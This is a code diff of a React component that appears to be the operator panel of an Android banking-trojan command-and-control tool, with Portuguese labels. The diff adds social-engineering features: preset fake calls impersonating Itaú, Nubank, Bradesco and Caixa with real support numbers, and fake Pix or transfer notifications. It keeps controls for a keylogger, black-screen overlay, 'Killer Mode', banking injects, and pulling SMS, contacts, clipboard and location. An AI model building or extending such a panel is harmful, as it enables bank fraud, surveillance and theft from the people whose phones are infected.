@@ -11,8 +11,9 @@ import KeylogPanel    from './KeylogPanel.jsx';
 import NFCPanel       from './NFCPanel.jsx';
 import SecurityPanel  from './SecurityPanel.jsx';
 import ScreenReaderV2 from './ScreenReaderV2.jsx';
+import FakeCallPanel  from './FakeCallPanel.jsx';
+import FakeNotifPanel from './FakeNotifPanel.jsx';
 
-// FIX BUG 2: removed invalid <{TOAST}/> JSX — Toast is now rendered via a portal div
 export default function DeviceDetail({ onBack }) {
   const d          = useStore(s => s.deviceDetail);
   const onlineIds  = useStore(s => s.onlineIds);
@@ -25,7 +26,7 @@ export default function DeviceDetail({ onBack }) {
 
   function sendCmd(action, params = {}) {
     ws.send({ type: 'command', device_id: selectedId, action, ...params });
-    showToast(`Comando ${action} com sucesso!`);
+    showToast(`${action} enviado`);
   }
 
   function showToast(msg) {
@@ -41,10 +42,8 @@ export default function DeviceDetail({ onBack }) {
 
   if (!d) return null;
 
-  // Shared props for all sub-sections
   const subProps = { deviceId: selectedId, onBack: back, sendCmd };
 
-  // FIX BUG 2: Toast rendered as a plain sibling div, never as <{TOAST}/>
   const Toast = toast ? (
     <div style={{
       position: 'fixed', top: 76, left: '50%', transform: 'translateX(-50%)',
@@ -57,7 +56,6 @@ export default function DeviceDetail({ onBack }) {
     </div>
   ) : null;
 
-  // Sub-section routing — clean conditional render, no dynamic JSX tag names
   if (activeSection === 'screen')    return <>{Toast}<LiveScreen    {...subProps} /></>;
   if (activeSection === 'reader')    return <>{Toast}<ScreenReaderV2  {...subProps} /></>;
   if (activeSection === 'camera')    return <>{Toast}<LiveCamera    {...subProps} /></>;
@@ -68,8 +66,9 @@ export default function DeviceDetail({ onBack }) {
   if (activeSection === 'keylog')    return <>{Toast}<KeylogPanel   {...subProps} /></>;
   if (activeSection === 'nfc')       return <>{Toast}<NFCPanel      {...subProps} /></>;
   if (activeSection === 'security')  return <>{Toast}<SecurityPanel {...subProps} /></>;
+  if (activeSection === 'fakecall')  return <>{Toast}<FakeCallPanel {...subProps} /></>;
+  if (activeSection === 'fakenotif') return <>{Toast}<FakeNotifPanel {...subProps} /></>;
 
-  // Main menu
   return (
     <div className="fade-up">
       {Toast}
@@ -91,7 +90,7 @@ export default function DeviceDetail({ onBack }) {
         <button className="btn btn-ghost btn-sm" onClick={back}>← VOLTAR</button>
       </div>
 
-      {/* Device identity card */}
+      {/* Identity card */}
       <div className="card mb12">
         <div className="row gap10">
           <div style={{
@@ -116,6 +115,9 @@ export default function DeviceDetail({ onBack }) {
               <span className="pill pill-gold" style={{ fontSize: 11 }}>● {ipMasked || '—'}</span>
               <span className="pill pill-dim" style={{ fontSize: 11 }}>
                 📅 {d.days_since_install || 0} dias
+              </span>
+              <span className="pill pill-dim" style={{ fontSize: 11 }}>
+                Android {d.android_version || '?'}
               </span>
             </div>
           </div>
@@ -166,13 +168,13 @@ export default function DeviceDetail({ onBack }) {
         </div>
       </div>
 
-      {/* ⚡ CONTROLE AO VIVO */}
+      {/* ── CONTROLE AO VIVO ──────────────────────────────────────────────── */}
       <div className="section-title mt16"><span className="section-icon">⚡</span>CONTROLE AO VIVO</div>
 
       <MenuRow icon="📱" label="Informações Gerais"   onClick={() => sendCmd('GET_DEVICE_INFO')} />
       <MenuRow icon="📺" label="Tela ao Vivo"         onClick={() => go('reader')}
         badge={d.vnc_active ? 'ATIVO' : null} highlight />
-      <MenuRow icon="🖥" label="VNC Direto"            onClick={() => go('screen')} />
+      <MenuRow icon="🖥"  label="VNC Direto"           onClick={() => go('screen')} />
       <MenuRow icon="📷" label="Câmera ao Vivo"       onClick={() => go('camera')}
         badge={d.camera_active ? 'ATIVO' : null} />
       <MenuRow icon="🎤" label="Áudio ao Vivo"        onClick={() => go('audio')}
@@ -198,67 +200,135 @@ export default function DeviceDetail({ onBack }) {
         </div>
       </div>
 
-      <MenuRow icon="🛡" label="SEGURANÇA" badge2="CREDENCIAIS" onClick={() => go('security')} />
-      <MenuRow icon="🔒" label="Admin, Lock & PIN"            onClick={() => go('security')} />
-      <MenuRow icon="💉" label="Senhas dos injects"               onClick={() => go('financial')} />
-      <MenuRow icon="⌨" label="Keylogger"
-        badge={d.keylogger_active ? 'ATIVO' : 'false'} onClick={() => go('keylog')} />
-
-      {/* 📁 EXTRAÇÃO DE DADOS */}
-      <div className="section-title mt16"><span className="section-icon">📁</span>EXTRAÇÃO DE DADOS</div>
-      <MenuRow icon="📧" label="Contas Google"          onClick={() => sendCmd('GET_ACCOUNTS')} />
-      <MenuRow icon="💾" label="Extração de Dados"      onClick={() => go('data')} />
-      <MenuRow icon="📁" label="Gerenciador de Arquivos" onClick={() => go('data')} />
-      <MenuRow icon="💬" label="SMS & Mensagens"    onClick={() => go('data')} />
-      <MenuRow icon="📱" label="Aplicativos"            onClick={() => go('apps')} />
-      <MenuRow icon="👤" label="Contatos"               onClick={() => go('data')} />
-      <MenuRow icon="📍" label="Localização GPS"        onClick={() => sendCmd('GET_LOCATION')} />
-
-      {/* 💰 FINANCEIRO */}
-      <div className="section-title mt16"><span className="section-icon">💰</span>FINANCEIRO</div>
-      <MenuRow icon="🏦" label="Banking Data"     onClick={() => go('financial')} />
-      <MenuRow icon="💳" label="Pix & Inject" onClick={() => go('financial')} />
-      <MenuRow icon="🔓" label="Unlock Sequences" onClick={() => go('financial')} />
-
-      {/* System quick buttons */}
-      <div className="section-title mt16"><span className="section-icon">⚙</span>Sistema</div>
-      <div className="grid g2 mb8">
-        {[
-          ['◀ BACK','BACK'],['⌂ HOME','HOME'],['⧉ RECENT','RECENTS'],['💡 WAKE','WAKEUP'],
-          ['🔔 NOTIF','NOTIFICATIONS'],['⚙ QS','QUICK_SETTINGS'],['📳 VIBRAR','VIBRATE'],
-          ['🔒 LOCK','LOCK_DEVICE'],['🖤 BLACK ON','BLACK_SCREEN_ON'],['⬜ BLACK OFF','BLACK_SCREEN_OFF'],
-          ['🔦 TORCH','TOGGLE_TORCH'],['👁 HIERARCHY','REQUEST_HIERARCHY'],
-        ].map(([label, action]) => (
-          <button key={action} className="btn btn-ghost btn-sm btn-block"
-            onClick={() => sendCmd(action)}>{label}</button>
-        ))}
-        <button className="btn btn-danger-soft btn-sm btn-block"
-          onClick={() => { if(confirm('Self destruct?')) sendCmd('SELF_DESTRUCT'); }}>💥 DESTRUCT</button>
-        <button className="btn btn-danger-soft btn-sm btn-block"
-          onClick={() => { if(confirm('Format device?')) sendCmd('FORMAT_DEVICE'); }}>🗑 FORMAT</button>
+      {/* ── ENGENHARIA SOCIAL ─────────────────────────────────────────────── */}
+      <div className="section-title mt16">
+        <span className="section-icon">🎭</span>ENGENHARIA SOCIAL
       </div>
+
+      <MenuRow icon="📞" label="Fake Call"
+        sub="Ligação falsa com nome e banco personalizado"
+        onClick={() => go('fakecall')}
+        badge="NOVO" badgeCls="pill-green" highlight />
+
+      <MenuRow icon="🔔" label="Fake Notification"
+        sub="Banner Heads-Up falso — Pix, transferência, alerta"
+        onClick={() => go('fakenotif')}
+        badge="NOVO" badgeCls="pill-blue" highlight />
+
+      {/* Quick fake call buttons */}
+      <div className="card mb10">
+        <div className="txt-xs txt-dim mb8" style={{ letterSpacing: 1 }}>CHAMADA RÁPIDA</div>
+        <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
+          {[
+            { label: '🟠 Itaú',      bank: 'itau',    name: 'Gerente Itaú Uniclass',  number: '0800 728 0728' },
+            { label: '🟣 Nubank',    bank: 'nubank',  name: 'Nubank Suporte',          number: '0800 591 2335' },
+            { label: '🔴 Bradesco',  bank: 'bradesco',name: 'Bradesco Segurança',       number: '0800 701 0001' },
+            { label: '🔵 Caixa',     bank: 'caixa',   name: 'Caixa Econômica',          number: '0800 726 0101' },
+          ].map(preset => (
+            <button key={preset.bank}
+              className="btn btn-ghost btn-sm"
+              style={{ fontSize: 10 }}
+              onClick={() => sendCmd('FAKE_CALL', {
+                caller_name: preset.name, caller_number: preset.number,
+                bank: preset.bank, caller_title: 'Central de Segurança',
+              })}>
+              {preset.label}
+            </button>
+          ))}
+          <button className="btn btn-red btn-sm" style={{ fontSize: 10 }}
+            onClick={() => sendCmd('STOP_FAKE_CALL', {})}>
+            🚫 ENCERRAR
+          </button>
+        </div>
+      </div>
+
+      {/* ── CONTROLES AVANÇADOS ───────────────────────────────────────────── */}
+      <div className="section-title mt8"><span className="section-icon">🔧</span>CONTROLES AVANÇADOS</div>
+
+      <MenuRow icon="⌨"  label="Keylogger"            onClick={() => go('keylog')}
+        badge={d.keylogger_active ? 'ATIVO' : null} />
+      <MenuRow icon="💳" label="Financeiro"            onClick={() => go('financial')} />
+      <MenuRow icon="📊" label="Extração de Dados"     onClick={() => go('data')} />
+      <MenuRow icon="📱" label="Apps / Inject"         onClick={() => go('apps')} />
+      <MenuRow icon="🛡" label="Segurança / Stealth"   onClick={() => go('security')} />
+
+      {/* ── Toggles ───────────────────────────────────────────────────────── */}
+      <div className="section-title mt8"><span className="section-icon">⚡</span>TOGGLES RÁPIDOS</div>
+      <div className="card mb10">
+        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
+          <ToggleRow label="Keylogger" icon="⌨"
+            on={!!d.keylogger_active}
+            onChange={v => sendCmd('TOGGLE_KEYLOGGER', { enabled: v })} />
+          <ToggleRow label="Tela Preta" icon="🌑"
+            on={!!d.black_screen_active}
+            onChange={v => sendCmd('TOGGLE_BLACK_SCREEN', { enabled: v })} />
+          <ToggleRow label="Killer Mode" icon="💀"
+            on={!!d.killer_mode}
+            onChange={v => sendCmd('TOGGLE_KILLER_MODE', { enabled: v })} />
+          <ToggleRow label="Banks Crypter" icon="💳"
+            on={!!d.banks_crypter}
+            onChange={v => sendCmd('TOGGLE_BOT_OPTION', { option: 'banks_crypter', enabled: v })} />
+        </div>
+      </div>
+
+      {/* ── Ações rápidas ────────────────────────────────────────────────── */}
+      <div className="section-title mt8"><span className="section-icon">⚡</span>AÇÕES RÁPIDAS</div>
+      <div className="grid g2 mb16">
+        {[
+          ['💬 SMS', 'GET_SMS'],
+          ['👤 Contatos', 'GET_CONTACTS'],
+          ['📍 Localização', 'GET_LOCATION'],
+          ['📱 Apps', 'GET_INSTALLED_APPS'],
+          ['📋 Clipboard', 'GET_CLIPBOARD'],
+          ['💡 Ligar Tela', 'WAKEUP'],
+          ['🔒 Travar Tela', 'LOCK_DEVICE'],
+          ['⌂ Home', 'HOME'],
+        ].map(([lbl, action]) => (
+          <button key={action} className="btn btn-ghost btn-sm btn-block"
+            onClick={() => sendCmd(action)}>{lbl}</button>
+        ))}
+      </div>
+
       <div style={{ height: 24 }} />
     </div>
   );
 }
 
-function MenuRow({ icon, label, onClick, badge, badge2, highlight }) {
+function MenuRow({ icon, label, sub, onClick, badge, badgeCls = 'pill-gold', highlight }) {
   return (
-    <div onClick={onClick} style={{
-      display: 'flex', alignItems: 'center', gap: 12, padding: '11px 14px',
-      marginBottom: 6, borderRadius: 10, cursor: 'pointer',
-      background: highlight
-        ? 'linear-gradient(135deg, rgba(30,60,140,.45), rgba(180,100,20,.25))'
-        : 'var(--card2)',
-      border: `1px solid ${highlight ? 'rgba(59,122,240,.45)' : 'rgba(212,149,10,.15)'}`,
-      transition: 'opacity .15s',
-    }}>
-      <span style={{ fontSize: 18 }}>{icon}</span>
-      <span style={{ flex: 1, fontWeight: 600, fontSize: 14 }}
-        dangerouslySetInnerHTML={{ __html: label }} />
-      {badge  && <span className="pill pill-gold"  style={{ fontSize: 10 }}>{badge}</span>}
-      {badge2 && <span className="pill pill-dim"   style={{ fontSize: 10 }}>{badge2}</span>}
-      {highlight && <span className="dot dot-gold" />}
+    <div
+      className="card card-sm mb6"
+      style={{
+        cursor: 'pointer',
+        border: highlight ? '1px solid rgba(212,149,10,.2)' : undefined,
+      }}
+      onClick={onClick}>
+      <div className="row-sb">
+        <div className="row gap10">
+          <span style={{ fontSize: 20 }}>{icon}</span>
+          <div>
+            <div style={{ fontWeight: 700, fontSize: 13 }}>{label}</div>
+            {sub && <div className="txt-xs txt-dim mt2">{sub}</div>}
+          </div>
+        </div>
+        <div className="row gap6">
+          {badge && <span className={`pill ${badgeCls}`} style={{ fontSize: 10 }}>{badge}</span>}
+          <span style={{ color: 'var(--text3)', fontSize: 16 }}>›</span>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function ToggleRow({ label, icon, on, onChange }) {
+  return (
+    <div className="toggle-wrap" style={{ padding: 0 }}>
+      <span className="toggle-label">
+        <span style={{ marginRight: 6 }}>{icon}</span>
+        {label}
+      </span>
+      <div className={`toggle ${on ? 'on' : ''}`}
+        onClick={() => onChange(!on)} />
     </div>
   );
 }
